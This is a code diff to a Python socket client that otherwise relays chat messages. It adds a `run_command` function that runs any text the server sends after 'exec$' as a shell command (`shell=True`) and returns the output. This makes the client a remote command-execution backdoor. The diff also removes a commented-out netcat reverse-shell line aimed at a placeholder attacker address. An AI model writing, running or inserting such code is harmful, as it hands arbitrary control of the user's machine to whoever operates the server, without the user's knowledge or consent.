@@ -1,5 +1,5 @@
 import socket, select, string, sys, os
-from subprocess import *
+import subprocess
 
 #Helper function (formatting)
 def display() :
@@ -47,29 +47,27 @@ def main():
 					resp = data.split("$")
 					if(resp[0].strip() == "exec"):
 						recv = resp[1]
-						# for i in resp:
-						# 	if i[:3] != "exec":
 						print(recv)
-								# cmdstr = i + " "
-						# print(cmdstr)
-						# for i in range(1, resp[1:].__len__()):
 
-						# print(cmdstr)
-						# nc attackerip 4444 -e /bin/sh
-						# command_stdout = Popen(['ls', '-la'], stdout=PIPE).communicate()[0]
-						# print(command_stdout)
-						# result = subprocess.check_output(, shell=True)
-
-						# sys.stdout.flush()on
-						# s.send(str(command_stdout).encode('utf-8'))
-					# sys.stdout.write(data)
-					# display()
+						#where client receives command
+						res = run_command(recv)
+	
+						#send command
+						s.send(res)
 
 		#user entered a message
 			else :
 				msg=sys.stdin.readline()
 				s.send(str(msg).encode('utf-8'))
 				# display()
+
+"""
+Runs command send from server with exec
+"""
+def run_command(cmd):
+	result = subprocess.check_output(cmd, shell=True)
+	return result
+
 
 if __name__ == "__main__":
 	main()
